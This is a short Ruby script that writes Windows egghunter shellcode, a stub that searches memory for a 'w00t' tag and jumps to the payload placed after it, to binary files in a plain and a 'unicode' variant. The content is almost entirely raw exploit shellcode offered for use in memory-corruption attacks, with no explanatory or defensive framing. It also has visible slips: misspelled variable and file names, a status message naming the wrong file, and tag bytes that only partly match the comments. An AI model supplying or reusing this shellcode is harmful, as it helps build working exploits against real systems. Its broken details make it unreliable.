#
enghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8" +
"\x77\x30\x30\x74" + # this is the marker/tag: w00t
"\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"

puts "Writing egghunter with tag w00t to file egghunter.bin...\n"
File.open("egghuner.bin", 'w'){|f| f.write(enghunter)}

puts "Writing egghunter with unicode tag to file egghunter.bin...\n"
File.open("egghunterunicode.bin", 'w'){
    |f| f.write(
        "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C"+
        "\x05\x5A\x74\xEF\xB8"+
        "\x00"+   # null
        "\x30"+   # 0
        "\x00"+   # null
        "\x74"+   # t
        "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
    )}